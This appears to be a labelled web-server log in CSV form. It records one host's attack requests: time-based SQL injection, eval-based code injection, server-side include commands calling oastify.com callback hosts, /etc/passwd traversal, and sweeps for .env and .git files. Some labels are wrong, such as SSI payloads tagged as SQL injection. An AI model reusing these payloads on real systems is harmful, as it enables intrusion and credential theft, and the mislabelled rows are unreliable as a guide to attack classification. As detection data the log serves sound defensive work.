timestamp,ip,method,url,status,attack_type,user_agent
2025-05-22 05:27:02,192.168.210.183,POST,/design-and-Evaluation-cell')AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:27:47,192.168.210.183,POST,/design-and-Evaluation-cell'%2c0)AND%20pg_sleep(20)--,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:29:11,192.168.210.183,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:31:34,192.168.210.183,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:35:47,192.168.210.183,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22sr9%22%20value%3d%22rq8ubpwmnp%22--%3e%3c!--%23set%20var%3d%22utb%22%20value%3d%22tsawdryopr%22--%3e%3c!--%23echo%20var%3d%22sr9%22--%3e%3c!--%23echo%20var%3d%22utb%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20edvhycj9ac6w5pbko0jc9yrw6ncg0do5mtdl0bo0.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:36:59,192.168.210.183,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:38:10,192.168.210.183,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22sr9%22%20value%3d%22rq8ubpwmnp%22--%3e%3c!--%23set%20var%3d%22utb%22%20value%3d%22tsawdryopr%22--%3e%3c!--%23echo%20var%3d%22sr9%22--%3e%3c!--%23echo%20var%3d%22utb%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20edvhycj9ac6w5pbko0jc9yrw6ncg09o1mpdh07ow.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:40:40,192.168.210.183,POST,/design-and-Evaluation-cell'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:41:20,192.168.210.183,POST,/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single')),200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:41:41,192.168.210.183,GET,/public/frontend/template/css/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:41:58,192.168.210.183,POST,/design-and-Evaluation-cell'.sleep(20).',200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:42:16,192.168.210.183,GET,/.git/HEAD,200,Sensitive Data Exposure Probe,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
2025-05-22 05:42:18,192.168.210.183,GET,/public/frontend/template/css/fonts%7b$%7bsleep(20)%7d%7d/fontawesome-webfont.woff2?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:42:32,192.168.210.183,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%226d9%22%20value%3d%225c88x3i093%22--%3e%3c!--%23set%20var%3d%228fb%22%20value%3d%227eaaz5k2b5%22--%3e%3c!--%23echo%20var%3d%226d9%22--%3e%3c!--%23echo%20var%3d%228fb%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20szvvkq5nwqsar3xyae5qvcdas1yumoag84zwmmab.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:42:37,192.168.210.183,GET,/.git/HEAD,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Sa"
2025-05-22 05:42:37,192.168.210.183,GET,/.git/config,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Sa"
2025-05-22 05:42:38,192.168.210.183,POST,/design-and-Evaluation-cell%7b$%7bsleep(20)%7d%7d,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:50:33,192.168.210.183,GET,/public/frontend/template/css//etc/passwd/fontawesome-webfont.woff2?v=4.6.1,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:54:53,192.168.210.183,POST,//etc/passwd,200,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 05:59:54,192.168.210.183,POST,/%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22u9t%22%20value%3d%22t8swtreo5r%22--%3e%3c!--%23set%20var%3d%22wbv%22%20value%3d%22vauyvtgq7t%22--%3e%3c!--%23echo%20var%3d%22u9t%22--%3e%3c!--%23echo%20var%3d%22wbv%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20gvfjge1bseoynrtm621er09yopuiih694xvpif64.oastify.com%22%20--%3e,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:04:07,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'(select*from(select(sleep(20)))a)'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:04:28,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2b(select*from(select(sleep(20)))a)%2b'?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:04:58,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%20and%20(select*from(select(sleep(20)))a)--%20?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:05:33,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2%2c(select*from(select(sleep(20)))a)?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:06:03,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%20waitfor%20delay'0%3a0%3a20'--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:06:34,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2')waitfor%20delay'0%3a0%3a20'--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:07:03,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2c0)waitfor%20delay'0%3a0%3a20'--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:07:33,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%7c%7cpg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:08:36,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%20AND%20pg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:09:06,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2c''%7c%7cpg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:09:11,192.168.210.183,GET,/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.3"
2025-05-22 06:09:16,192.168.210.183,GET,/robots.txt,200,Remote File Inclusion (RFI),facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
2025-05-22 06:09:26,192.168.210.183,GET,/!.htaccess,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:09:32,192.168.210.183,GET,/!.htaccess,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:09:42,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2')AND%20pg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:09:58,192.168.210.183,GET,/.c9/metadata/environment/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:05,192.168.210.183,GET,/public/frontend/template/css/fonts/fontawesome-webfont.woff2'%2c0)AND%20pg_sleep(20)--?v=4.6.1,200,SQL Injection,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.3"
2025-05-22 06:10:12,192.168.210.183,GET,/.config.php.swp,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:28,192.168.210.183,GET,/.docker/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:29,192.168.210.183,GET,/.docker/laravel/app/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:31,192.168.210.183,GET,/.DS_Store,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:32,192.168.210.183,GET,/.ds_store,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:36,192.168.210.183,GET,/.env,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:36,192.168.210.183,GET,/.env.example,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:37,192.168.210.183,GET,/.env-example,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,192.168.210.183,GET,/.env.development.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,192.168.210.183,GET,/.env.development.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,192.168.210.183,GET,/.env.dev,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,192.168.210.183,GET,/.env.backup,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:38,192.168.210.183,GET,/.env.dev.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,192.168.210.183,GET,/.env.dist,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,192.168.210.183,GET,/.env-sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,192.168.210.183,GET,/.env.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,192.168.210.183,GET,/.env.docker.dev,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,192.168.210.183,GET,/.env.docker,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:39,192.168.210.183,GET,/.env.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,192.168.210.183,GET,/.env.prod,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,192.168.210.183,GET,/.env.prod.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,192.168.210.183,GET,/.env.sample.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:40,192.168.210.183,GET,/.env.production,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,192.168.210.183,GET,/.env.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,192.168.210.183,GET,/.env.stage,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,192.168.210.183,GET,/.env.test,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,192.168.210.183,GET,/.env.save,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:41,192.168.210.183,GET,/.env.test.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,192.168.210.183,GET,/.env.production.local,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,192.168.210.183,GET,/.env.test.sample,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,192.168.210.183,GET,/.env.travis,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:42,192.168.210.183,GET,/.environment,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:43,192.168.210.183,GET,/.envrc,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:43,192.168.210.183,GET,/.env~,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:43,192.168.210.183,GET,/.envs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:57,192.168.210.183,GET,/.ghc.environment,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:58,192.168.210.183,GET,/.git/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:58,192.168.210.183,GET,/.git/branches/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,192.168.210.183,GET,/.git/COMMIT_EDITMSG,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,192.168.210.183,GET,/.git/description,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,192.168.210.183,GET,/.git/config,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,192.168.210.183,GET,/.git/FETCH_HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:10:59,192.168.210.183,GET,/.git/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,192.168.210.183,GET,/.git/head,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,192.168.210.183,GET,/.git/hooks/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,192.168.210.183,GET,/.git/hooks/applypatch-msg,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,192.168.210.183,GET,/.git/hooks/post-update,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:00,192.168.210.183,GET,/.git/hooks/pre-rebase,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,192.168.210.183,GET,/.git/hooks/commit-msg,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,192.168.210.183,GET,/.git/hooks/pre-push,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,192.168.210.183,GET,/.git/hooks/pre-applypatch,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,192.168.210.183,GET,/.git/hooks/pre-receive,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:01,192.168.210.183,GET,/.git/hooks/pre-commit,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,192.168.210.183,GET,/.git/info/attributes,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,192.168.210.183,GET,/.git/index,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,192.168.210.183,GET,/.git/info/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,192.168.210.183,GET,/.git/hooks/update,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,192.168.210.183,GET,/.git/info/refs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:02,192.168.210.183,GET,/.git/hooks/prepare-commit-msg,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:03,192.168.210.183,GET,/.git/info/exclude,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:03,192.168.210.183,GET,/.git/logs/,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:03,192.168.210.183,GET,/.git/logs/head,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,192.168.210.183,GET,/.git/logs/refs,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,192.168.210.183,GET,/.git/logs/refs/heads,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,192.168.210.183,GET,/.git/logs/refs/remotes/origin,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,192.168.210.183,GET,/.git/logs/HEAD,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-22 06:11:04,192.168.210.183,GET,/.git/logs/refs/remotes,200,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
